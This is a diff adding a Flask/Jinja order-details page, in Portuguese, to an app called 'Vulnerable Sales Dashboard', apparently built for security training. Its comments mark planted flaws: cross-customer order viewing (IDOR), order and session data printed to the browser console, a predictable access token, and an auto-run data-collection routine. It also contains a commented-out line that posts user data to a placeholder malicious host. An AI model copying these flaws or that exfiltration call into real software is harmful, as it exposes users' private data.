@@ -1,0 +1,329 @@
+{% extends "base.html" %}
+
+{% block title %}Pedido #{{ order[0] }} - Vulnerable Sales Dashboard{% endblock %}
+
+{% block content %}
+<div class="row mb-4">
+    <div class="col-12">
+        <h1><i class="fas fa-shopping-cart"></i> Detalhes do Pedido #{{ order[0] }}</h1>
+        <nav aria-label="breadcrumb">
+            <ol class="breadcrumb">
+                <li class="breadcrumb-item"><a href="{{ url_for('dashboard') }}">Dashboard</a></li>
+                <li class="breadcrumb-item"><a href="{{ url_for('orders') }}">Pedidos</a></li>
+                <li class="breadcrumb-item active">Pedido #{{ order[0] }}</li>
+            </ol>
+        </nav>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-info-circle"></i> Informações do Pedido</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <table class="table table-borderless">
+                            <tr>
+                                <td><strong>ID do Pedido:</strong></td>
+                                <td>#{{ order[0] }}</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Cliente:</strong></td>
+                                <td>
+                                    <a href="/user/{{ order[1] }}" class="text-decoration-none">
+                                        Cliente #{{ order[1] }}
+                                    </a>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td><strong>Funcionário:</strong></td>
+                                <td>
+                                    {% if order[2] %}
+                                        <a href="/user/{{ order[2] }}" class="text-decoration-none">
+                                            Funcionário #{{ order[2] }}
+                                        </a>
+                                    {% else %}
+                                        <span class="text-muted">Não atribuído</span>
+                                    {% endif %}
+                                </td>
+                            </tr>
+                            <tr>
+                                <td><strong>Valor Total:</strong></td>
+                                <td class="h5 text-success">R$ {{ "%.2f"|format(order[3]) }}</td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <div class="col-md-6">
+                        <table class="table table-borderless">
+                            <tr>
+                                <td><strong>Status:</strong></td>
+                                <td>
+                                    {% set status_class = {
+                                        'pending': 'warning',
+                                        'processing': 'info', 
+                                        'completed': 'success',
+                                        'cancelled': 'danger'
+                                    } %}
+                                    <span class="badge bg-{{ status_class.get(order[4], 'secondary') }} fs-6">
+                                        {{ order[4].title() }}
+                                    </span>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td><strong>Data do Pedido:</strong></td>
+                                <td>{{ order[5].strftime('%d/%m/%Y às %H:%M') if order[5] else 'N/A' }}</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Última Atualização:</strong></td>
+                                <td class="text-muted">{{ order[5].strftime('%d/%m/%Y às %H:%M') if order[5] else 'N/A' }}</td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+                
+                <!-- Order Actions -->
+                <div class="mt-4">
+                    <h6>Ações do Pedido:</h6>
+                    <div class="btn-group" role="group">
+                        {% if session.role in ['admin', 'employee'] %}
+                        <button class="btn btn-warning" onclick="updateStatus('{{ order[0] }}', '{{ order[4] }}')">
+                            <i class="fas fa-edit"></i> Alterar Status
+                        </button>
+                        {% endif %}
+                        {% if session.role in ['admin'] %}
+                        <button class="btn btn-info" onclick="assignEmployee('{{ order[0] }}')">
+                            <i class="fas fa-user-plus"></i> Atribuir Funcionário
+                        </button>
+                        {% endif %}                        
+                        <button class="btn btn-primary" onclick="printOrder('{{ order[0] }}')">
+                            <i class="fas fa-print"></i> Imprimir
+                        </button>                        
+                        {% if session.role in ['admin', 'employee'] %}
+                        <button class="btn btn-danger" onclick="cancelOrder('{{ order[0] }}')">
+                            <i class="fas fa-times"></i> Cancelar
+                        </button>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Order Items -->
+        <div class="card mt-4">
+            <div class="card-header">
+                <h5><i class="fas fa-list"></i> Itens do Pedido</h5>
+            </div>
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-striped">
+                        <thead>
+                            <tr>
+                                <th>Produto</th>
+                                <th>Quantidade</th>
+                                <th>Preço Unitário</th>
+                                <th>Subtotal</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% if order_items %}
+                                {% for item in order_items %}
+                                <tr>
+                                    <td>{{ item[0] }}</td>
+                                    <td>{{ item[1] }}</td>
+                                    <td>R$ {{ "%.2f"|format(item[2]) }}</td>
+                                    <td>R$ {{ "%.2f"|format(item[1] * item[2]) }}</td>
+                                </tr>
+                                {% endfor %}
+                            {% else %}
+                            <tr>
+                                <td colspan="4" class="text-center text-muted">
+                                    Itens do pedido não encontrados
+                                </td>
+                            </tr>
+                            {% endif %}
+                        </tbody>
+                        <tfoot>
+                            <tr class="table-dark">
+                                <th colspan="3">Total:</th>
+                                <th>R$ {{ "%.2f"|format(order[3]) }}</th>
+                            </tr>
+                        </tfoot>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <!-- Order Navigation (IDOR demonstration) -->
+        <div class="card">
+                  
+            <!-- Customer Information -->
+            <div class="card mt-3">
+                <div class="card-header">
+                    <h6><i class="fas fa-user"></i> Informações do Cliente</h6>
+                </div>
+                <div class="card-body">
+                    <p><strong>ID do Cliente:</strong> {{ order[1] }}</p>
+                    <a href="/user/{{ order[1] }}" class="btn btn-sm btn-primary">
+                        <i class="fas fa-eye"></i> Ver Perfil do Cliente
+                    </a>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Session Information -->
+        <div class="card mt-3">
+            <div class="card-header">
+                <h6><i class="fas fa-info-circle"></i> Sua Sessão</h6>
+            </div>
+            <div class="card-body">
+                <small>
+                    <strong>Seu ID:</strong> {{ session.user_id }}<br>
+                    <strong>Sua Função:</strong> {{ session.role }}<br>
+                    <strong>Visualizando:</strong> Pedido #{{ order[0] }}<br>
+                    <strong>Cliente do Pedido:</strong> #{{ order[1] }}
+                </small>
+                
+                {% if session.role == 'customer' and session.user_id != order[1] %}
+                <div class="alert alert-danger mt-2 p-2">
+                    <small>
+                        <i class="fas fa-exclamation-triangle"></i>
+                        Você está visualizando o pedido de outro cliente!
+                    </small>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    
+    </div>
+</div>
+
+{% endblock %}
+
+{% block extra_js %}
+<script>
+// Alterar status do pedido
+function updateStatus(orderId, currentStatus) {
+    const statuses = ['pending', 'processing', 'completed', 'cancelled'];
+    const newStatus = prompt(`Status atual: ${currentStatus}\nNovo status (pending/processing/completed/cancelled):`);
+
+    if (newStatus && statuses.includes(newStatus)) {
+        fetch('/api/update_order_status', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ order_id: orderId, status: newStatus })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) location.reload();
+            else alert('Erro ao atualizar status: ' + (data.error || 'Desconhecido'));
+        })
+        .catch(err => alert('Falha na requisição: ' + err));
+    }
+}
+
+// Atribuir funcionário ao pedido
+function assignEmployee(orderId) {
+    const employeeId = prompt('Digite o ID do funcionário para atribuir:');
+    if (!employeeId) return;
+
+    fetch('/api/assign_employee', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ order_id: orderId, employee_id: employeeId })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.success) location.reload();
+        else alert('Erro ao atribuir funcionário: ' + (data.error || 'Desconhecido'));
+    })
+    .catch(err => alert('Falha na requisição: ' + err));
+}
+
+// Cancelar pedido
+function cancelOrder(orderId) {
+    if (!confirm(`Tem certeza que deseja cancelar o pedido #${orderId}?`)) return;
+
+    fetch('/api/cancel_order', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ order_id: orderId })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.success) location.reload();
+        else alert('Erro ao cancelar pedido: ' + (data.error || 'Desconhecido'));
+    })
+    .catch(err => alert('Falha na requisição: ' + err));
+}
+
+// Imprimir pedido
+function printOrder(orderId) {
+    const printWindow = window.open('', '_blank');
+    printWindow.document.write(`
+        <html>
+        <head><title>Pedido #${orderId}</title></head>
+        <body>
+            <h1>Pedido #${orderId}</h1>
+            <p>Cliente ID: {{ order[1] }}</p>
+            <p>Valor Total: R$ {{ "%.2f"|format(order[3]) }}</p>
+            <p>Status: {{ order[4] }}</p>
+            <hr>
+            <h3>Itens do Pedido:</h3>
+            <ul>
+            {% for item in order_items %}
+                <li>{{ item[1] }} x {{ item[0] }} - R$ {{ "%.2f"|format(item[2]) }} cada</li>
+            {% endfor %}
+            </ul>
+        </body>
+        </html>
+    `);
+    printWindow.document.close();
+    printWindow.print();
+    printWindow.close();
+}
+
+// Demonstrate data exposure in console
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Order Information (Exposed):');
+    console.log('Order ID:', '{{ order[0] }}');
+    console.log('Customer ID:', '{{ order[1] }}');
+    console.log('Employee ID:', '{{ order[2] }}');
+    console.log('Total Amount:', '{{ order[3] }}');
+    console.log('Status:', '{{ order[4] }}');
+    console.log('Current User ID:', '{{ session.user_id }}');
+    console.log('Current User Role:', '{{ session.role }}');
+    
+    // Simulate session token exposure
+    const orderToken = 'order_access_token_' + '{{ order[0] }}' + '_' + '{{ session.user_id }}';
+    console.log('Weak Order Access Token:', orderToken);
+});
+
+// Simulate automatic data collection (privacy violation)
+function collectUserData() {
+    const userData = {
+        orderId: '{{ order[0] }}',
+        customerId: '{{ order[1] }}',
+        viewerId: '{{ session.user_id }}',
+        viewerRole: '{{ session.role }}',
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer
+    };
+    
+    console.log('User data collected (Privacy Violation):', userData);
+    
+    // In a real vulnerable app, this data might be sent to external servers
+    // fetch('https://malicious-site.com/collect', { method: 'POST', body: JSON.stringify(userData) });
+}
+
+// Auto-execute data collection
+setTimeout(collectUserData, 2000);
+</script>
+{% endblock %}
+
